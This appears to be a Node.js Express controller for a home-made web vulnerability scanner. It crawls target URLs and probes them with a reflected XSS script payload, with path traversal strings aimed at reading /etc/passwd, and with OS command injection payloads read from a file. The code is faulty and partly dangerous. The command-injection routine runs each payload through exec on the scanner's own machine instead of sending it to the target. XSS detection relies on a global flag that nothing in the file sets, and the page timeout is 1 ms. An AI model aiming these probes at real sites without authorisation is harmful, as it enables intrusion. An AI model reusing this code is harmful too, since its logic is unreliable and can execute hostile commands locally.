const fs = require('fs');
const axios = require('axios');
const cheerio = require('cheerio');
const readline = require('readline');
const open = require('open');
const puppeteer = require('puppeteer');
const http = require('http');
const { response } = require('express');
const scan = require("../models/scan");
const express = require("express");
const crawl = require('../crawl_depth');
const path_scan = require('../pathtraversal_scan');
const AsyncLock = require('async-lock');
const lock = new AsyncLock();
const router = express.Router();
const { exec } = require('child_process');
const request = require('request');


const xss_payload_arr = fs.readFileSync('xss_payload.txt').toString().split("\n");
const os_command_injection_payload_arr = fs.readFileSync('os_command_injection_payload.txt').toString().split("\n");


let xss_scan_success_data = false

const xss_scan_success = (req, res) => {

  xss_scan_success_data = true

  return xss_scan_success_data
}

let scanID = 0;

const getNewScanID = () => {
  return new Promise((resolve, reject) => {
    lock.acquire('scanID', () => {
      scanID++;
      resolve(scanID);
    });
  });
};

const fast_scan_xss = async(req, res) => {

}

//input 태그 찾는 로직 추가해야됨, front: 데이터 넘어가면 result 페이지로 redirect 시켜야됨
const xss_scan = async(req, res) => {
  const currentScanID = await getNewScanID();

  const {href, option} = req.body;

  const regexp = /=/g;

  await crawl(href);

  const site_tree = fs.readFileSync('site_tree.txt').toString().split("\n");

  if(option == "fast"){
    const payload = "<script>alert('xss test');</script>";
      
    for(const i in site_tree){
      const match1 = site_tree[i].indexOf("?");
      const match2 = site_tree[i].indexOf("=");
      const match3 = site_tree[i].match(regexp);
      const match4 = site_tree[i].indexOf("&");

      if (match1 !== -1 && match2 !== -1 && match3 && match3.length < 2 && match4 === -1) {

        let victim_base_url = site_tree[i].substr(0, match2 + 1);
        let victim_url = victim_base_url + payload;
        console.log(victim_url);

        const options = {
          uri: victim_url,
        };
  
        request(options, function(err, response, body) {
          if (err) {
            console.error(err);
            return;
          }

        if(body.includes(payload)){
          scan.create({
            scanID: currentScanID,
            scanType: "Fast Scan Reflected XSS",
            inputURL: href,
            scanURL: victim_base_url,
            scanPayload: payload
        });
        }
      });
    }
  }
    } else {
      for(let i in site_tree){
        const match1 = site_tree[i].indexOf("?");
        const match2 = site_tree[i].indexOf("=");
        const match3 = site_tree[i].match(regexp);
        const match4 = site_tree[i].indexOf("&");
    
        if(match1 !== -1 && match2 !== -1 && match3 && match3.length < 2 && match4 === -1){
          for (let j in xss_payload_arr) {
            xss_payload = xss_payload_arr[j];
    
            try {
              let victim_base_url = site_tree[i].substr(0, match2 + 1)
              let victim_url = victim_base_url + xss_payload;
              console.log(victim_url);
    
              const browser = await puppeteer.launch({headless:'new'});
              const page = await browser.newPage();
      
              if (xss_scan_success_data) {
                scan.create({
                  scanID: currentScanID,
                  scanType: "Reflected XSS",
                  inputURL: href,
                  scanURL: victim_base_url,
                  scanPayload: xss_payload
                });
      
                xss_scan_success_data = false
              }
      
              await page.setDefaultNavigationTimeout(1);
              await page.goto(victim_url);
              await browser.close();
      
            } catch (error) {
              continue;
            }
        }
        }
      }
    }




};


//path traversal 취약점 스캔로직
const pathtraversal_scan = async(req, res) => {
  const currentScanID = await getNewScanID();

  const url = req.body.href;
  const path_traversal_payload_arr = "../";
  const regexp = /=/g;

  await crawl(url);

  const site_tree = fs.readFileSync('site_tree.txt').toString().split("\n");

  for(let i in site_tree){
    const match1 = site_tree[i].indexOf("?");
    const match2 = site_tree[i].indexOf("=");
    const match3 = site_tree[i].match(regexp);
    const match4 = site_tree[i].indexOf("&");

    if(match1 !== -1 && match2 !== -1 && match3 && match3.length < 2 && match4 === -1){
      for (let j = 0; j < 10; j++) {
        try {
          let path_traversal_scan_payload = path_traversal_payload_arr.repeat(j + 1) + "etc/passwd"
          let victim_url = site_tree[i].substr(0, match2 + 1) + path_traversal_scan_payload;

          const response = await new Promise(resolve => {
              http.request(victim_url, resolve).end();
          });
          const status = response.statusCode;

          if (status === 200) {
          
              scan.create({
              scanID: currentScanID,
              scanType: "Path Traversal",
              inputURL: url,
              scanURL: site_tree[i],
              scanPayload: path_traversal_scan_payload
              });
              break;
          }
        } 
        catch(error) {
          continue;
        }
      }
    }
    else{
        console.log('query가 발견되지 않았습니다.');
    }
  }       
}

const os_command_injection = async (req, res) => {
  const currentScanID = await getNewScanID();
  const url = req.body.href;

  for (let i in os_command_injection_payload_arr) {
    const os_command_injection_payload = os_command_injection_payload_arr[i];

    try {
      
      exec(os_command_injection_payload, async (error, stdout, stderr) => {
        if (error) {
          console.error(`Error with payload ${os_command_injection_payload}:`, error);
          return;
        }
        
        await scan.create({
          scanID: currentScanID,
          scanType: "OS Command Injection",
          inputURL: url,
          scanURL: url, // scanURL might be different based on your scenario
          scanPayload: os_command_injection_payload,
        });
      });
      
    } catch (error) {
      console.error(`Error with payload ${os_command_injection_payload}:`, error);
      continue;
    }
  }
};






module.exports = {
    xss_scan,
    xss_scan_success,
    pathtraversal_scan,
    os_command_injection,
    fast_scan_xss,
}